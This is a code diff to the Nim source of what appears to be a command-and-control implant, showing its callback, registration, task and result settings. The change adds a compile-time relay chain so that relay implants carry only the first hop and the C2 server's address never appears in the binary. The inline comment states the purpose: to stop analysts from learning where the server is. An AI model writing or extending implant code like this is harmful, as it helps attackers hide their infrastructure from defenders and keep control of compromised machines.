@@ -547,8 +547,25 @@ proc httpHandler() {.async.} =
     # Load configuration into listener
     listener.listenerType = CONFIG.getOrDefault("listenerType", "HTTP")
     listener.listenerHost = ""  # No longer used, logic moved to doRequest
-    listener.implantCallbackIp = CONFIG.getOrDefault("implantCallbackIp", "127.0.0.1")
-    listener.listenerPort = CONFIG.getOrDefault("listenerPort", "80")
+    
+    # SECURITY FIX: Relay clients should NOT have C2 URL compiled into binary
+    # Only use first hop from RELAY_CHAIN to avoid exposing C2 location
+    const RELAY_CHAIN {.strdefine.}: string = ""
+    when RELAY_CHAIN != "":
+        # Extract first hop (host:port) from RELAY_CHAIN
+        const relayChainParts = RELAY_CHAIN.split(",")
+        const firstHop = relayChainParts[0]
+        # Parse host and port from first hop
+        let hopParts = firstHop.split(":")
+        listener.implantCallbackIp = hopParts[0]
+        listener.listenerPort = if hopParts.len > 1: hopParts[1] else: "80"
+        when defined debug:
+            echo "[DEBUG] 🔒 SECURITY: Relay client using first hop only (C2 URL not compiled)"
+            echo "[DEBUG] 🔒 First hop: " & firstHop
+    else:
+        # Standard implant - load C2 URL from config
+        listener.implantCallbackIp = CONFIG.getOrDefault("implantCallbackIp", "127.0.0.1")
+        listener.listenerPort = CONFIG.getOrDefault("listenerPort", "80")
     listener.registerPath = CONFIG.getOrDefault("listenerRegPath", "/register")
     listener.taskPath = CONFIG.getOrDefault("listenerTaskPath", "/task")
     listener.resultPath = CONFIG.getOrDefault("listenerResPath", "/result")
